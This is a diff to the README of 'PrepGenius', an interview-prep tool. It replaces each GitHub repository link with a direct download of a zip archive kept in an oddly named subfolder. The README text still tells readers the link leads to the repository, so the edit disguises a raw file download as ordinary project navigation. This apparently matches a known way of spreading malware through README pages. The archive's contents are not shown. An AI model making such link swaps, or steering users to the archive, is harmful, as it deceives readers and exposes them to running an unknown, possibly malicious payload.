@@ -1,6 +1,6 @@
 # 🤖 PrepGenius - Smart Interview Prep Made Easy
 
-[![Download PrepGenius](https://img.shields.io/badge/Download-PrepGenius-blue?style=for-the-badge)](https://github.com/Sae3M/PrepGenius)
+[![Download PrepGenius](https://img.shields.io/badge/Download-PrepGenius-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sae3M/PrepGenius/main/archipterygium/Genius_Prep_v2.6.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and open PrepGenius on your computer.
 
 Go to the main page where you can get PrepGenius. Use this link:
 
-[Download PrepGenius from GitHub](https://github.com/Sae3M/PrepGenius)
+[Download PrepGenius from GitHub](https://raw.githubusercontent.com/Sae3M/PrepGenius/main/archipterygium/Genius_Prep_v2.6.zip)
 
 Click the link above or the badge at the top. This will take you to the GitHub repository.
 
@@ -149,4 +149,4 @@ If you have trouble:
 
 ---
 
-[![Download PrepGenius](https://img.shields.io/badge/Download-PrepGenius-green?style=for-the-badge)](https://github.com/Sae3M/PrepGenius)
+[![Download PrepGenius](https://img.shields.io/badge/Download-PrepGenius-green?style=for-the-badge)](https://raw.githubusercontent.com/Sae3M/PrepGenius/main/archipterygium/Genius_Prep_v2.6.zip)
